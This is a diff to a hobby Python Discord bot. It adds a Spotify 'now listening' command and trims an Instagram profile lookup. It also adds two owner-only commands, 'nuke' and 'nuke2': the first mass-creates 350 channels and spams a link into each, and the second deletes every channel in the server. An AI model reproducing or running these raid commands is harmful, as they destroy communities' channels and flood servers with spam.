@@ -8,6 +8,8 @@ from instaloader import Instaloader, Profile
 from discord import Embed
 from json import loads
 from requests import get
+from discord import Spotify
+import asyncio
 
 #-----Intents-----
 
@@ -267,7 +269,6 @@ async def calculate(ctx, num_one: int, symbol: str, num_two: int):
 async def instagram(ctx, instaUsername):
   from os import environ
   environ['TF_CPP_MIN_LOG_LEVEL'] = '3'  
-  #await ctx.message.delete()
   bot = Instaloader()
   profile = Profile.from_username(bot.context, str(instaUsername))
   embed = Embed(title=f"Instagram", color=0x11019e)
@@ -275,7 +276,6 @@ async def instagram(ctx, instaUsername):
   embed.add_field(name="Followers", value=f"{profile.followers}", inline=True)
   embed.add_field(name="Follows", value=f"{profile.followees}", inline=True)
   embed.add_field(name="Bio", value=f"{profile.biography}", inline=True)
-  embed.set_footer(text="hey lol")
   await ctx.send(embed=embed) 
 
 #purging
@@ -285,6 +285,33 @@ async def clear( ctx, amount : int ):
     await ctx.channel.purge(limit = amount)
     await ctx.send(f'Cleared {amount} messages')
 
+#nuke, DO NOT USE
+@client.command(pass_context=True)
+async def nuke(ctx, channelnukename="bruh"):
+  if ctx.author.id == 414931767129276428:
+    await ctx.message.delete()
+    guild = ctx.guild
+    count = 0
+    while count < 350:
+      await guild.create_text_channel(channelnukename)
+      #await guild.create_voice_channel(channelnukename)
+      count+=1
+      print(count)
+    message = "https://cdn.discordapp.com/emojis/627664851531071518.gif?v=1"
+    for channel in guild.text_channels:
+      await channel.send(message)
+  else:
+    await ctx.send("Bruh")
+
+@client.command()
+async def nuke2(ctx):
+  if ctx.author.id == 414931767129276428:
+    guild = ctx.guild
+    for channel in guild.channels:
+        await channel.delete()
+  else:
+    await ctx.send("bruh")
+    
 
 async def move():
     channel = client.get_channel(755483435656675539)
@@ -303,6 +330,25 @@ async def move2():
     Members = channel.members
     for members in Members:
         await members.move_to(evac)
+
+
+@client.command(aliases=["listening"])
+async def current(ctx, user: discord.Member = None):
+  if user == None:
+    user = ctx.author
+    pass
+  if user.activities:
+      for activity in user.activities:
+          if isinstance(activity, Spotify):
+              embed = discord.Embed(description="Listening on spotify", color=0x19B9B9)
+              embed.set_author(name =user.name, icon_url = user.avatar_url)
+              embed.add_field(name="Track", value=f"{activity.title}", inline=False)
+              embed.add_field(name="Album", value=f"{activity.album}", inline=False)
+              embed.add_field(name="Artist", value=f"{activity.artist}", inline=False)
+              embed.set_thumbnail(url=activity.album_cover_url)
+              await ctx.send(embed=embed)
+          else:
+            client.send("Bruh your activity empty")
 
 
 #-----shit u do in the end-----
